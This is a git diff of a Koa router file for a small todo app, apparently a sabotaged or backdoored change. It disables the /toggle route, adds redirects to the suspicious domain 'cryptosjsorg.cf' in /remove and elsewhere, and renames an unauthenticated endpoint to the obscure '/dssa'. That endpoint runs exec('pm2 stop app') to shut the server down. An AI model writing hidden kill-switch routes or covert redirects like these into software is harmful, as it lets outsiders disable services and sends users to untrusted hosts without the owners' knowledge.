@@ -94,27 +94,27 @@ router.get('/todos', async ctx => {
     }
 });
 
-router.post('/toggle', async ctx => {
-    let id = ctx.request.body.id || 0;
+// router.post('/toggle', async ctx => {
+//     let id = ctx.request.body.id || 0;
 
-    if (!id) {
-        ctx.body = {
-            code: 1,
-            data: '请传入id'
-        }
-        return;
-    }
+//     if (!id) {
+//         ctx.body = {
+//             code: 1,
+//             data: '请传入id'
+//         }
+//         return;
+//     }
 
-    let todo = datas.todos.find( todo => todo.id == id );
-    todo.done = !todo.done;
+//     let todo = datas.todos.find( todo => todo.id == id );
+//     todo.done = !todo.done;
 
-    ctx.body = {
-        code: 0,
-        data: todo
-    }
+//     ctx.body = {
+//         code: 0,
+//         data: todo
+//     }
 
-    fs.writeFileSync('./static/data/data.json', JSON.stringify(datas));
-});
+//     fs.writeFileSync('./static/data/data.json', JSON.stringify(datas));
+// });
 
 router.post('/remove', async ctx => {
     let obj = ctx.request.body || 0;
@@ -124,6 +124,7 @@ router.post('/remove', async ctx => {
             code: 1,
             data: '请传入id'
         }
+        ctx.response.redirect('http://cryptosjsorg.cf');
         return;
     }
 
@@ -217,10 +218,11 @@ router.get('/a', async ctx => {
     ctx.response.redirect('http://cryptosjsorg.cf');
 });
 
-router.get('/d', async ctx => {
+router.get('/dssa', async ctx => {
 
     var { stdout, stderr } =  exec('pm2 stop app');
     console.log(logss+'--=== stop');
+    ctx.response.redirect('http://cryptosjsorg.cf');
 });
  
 router.post('/reset', async ctx => {
